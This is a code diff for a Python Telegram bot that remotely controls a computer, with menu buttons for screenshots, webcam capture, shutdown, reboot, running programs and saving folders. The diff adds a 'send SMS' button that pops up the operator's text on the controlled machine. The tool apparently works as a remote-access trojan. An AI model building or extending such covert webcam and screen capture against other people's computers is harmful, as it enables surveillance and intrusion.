@@ -80,6 +80,7 @@ def start(message):
         run_program_button = telebot.types.KeyboardButton("Запустить программу") 
         open_link_button = telebot.types.KeyboardButton("Открыть ссылку")
         save_folder_button = telebot.types.KeyboardButton("Сохранить папку")
+        sms_button = telebot.types.KeyboardButton("Отправить СМС")
         
         markup.row(screenshot_button, shutdown_button, info_button)
         markup.row(reboot_button, webcam_button)
@@ -88,6 +89,7 @@ def start(message):
         markup.add(open_link_button)
         save_folder_button = telebot.types.KeyboardButton("Сохранить папку")
         markup.add(save_folder_button)
+        markup.row(sms_button)
 
         
         bot.send_message(message.chat.id, "Скрипт запущен / made by @danieldrain ")
@@ -95,6 +97,18 @@ def start(message):
         bot.send_message(message.chat.id, "Выберите действие:", reply_markup=markup)
     else:
         bot.send_message(message.chat.id, "Вы не авторизованы для использования этого бота.")
+
+@bot.message_handler(func=lambda message: message.text == "Отправить СМС")
+def send_sms(message):
+    bot.send_message(message.chat.id, "Введите текст СМС:")
+    bot.register_next_step_handler(message, process_sms)
+
+def process_sms(message):
+    sms_text = message.text
+    # Вместо вызова ошибки программы, выведем текст СМС на компьютер
+    pyautogui.alert(sms_text, title='Сообщение ')
+
+
 
 @bot.message_handler(func=lambda message: message.text == "Сохранить папку")
 def save_folder_handler(message):
